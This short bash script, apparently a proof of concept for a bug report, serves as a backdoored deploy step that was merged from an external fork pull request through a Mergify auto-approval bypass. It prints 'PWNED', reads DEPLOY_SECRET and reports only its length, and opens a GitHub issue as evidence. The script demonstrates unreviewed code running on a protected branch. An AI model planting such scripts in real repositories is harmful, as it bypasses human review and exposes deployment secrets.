#!/usr/bin/env bash
set -e
# BACKDOOR via external fork PR (auto-approved by Mergify review bypass)
echo "f8 deploy"
echo "PWNED: external (non-member) fork code executing on protected branch f8main"
echo "secret length=${#DEPLOY_SECRET}"
gh issue create --repo "$GITHUB_REPOSITORY" --title "PWNED-f8-external-auto-approve" --body "External fork PR (author_association NONE) auto-approved by Mergify review action, satisfied required-review, merged to protected f8main with NO human review, now executing. DEPLOY_SECRET length=${#DEPLOY_SECRET}." 2>&1 | head -2 || echo "issue attempted"
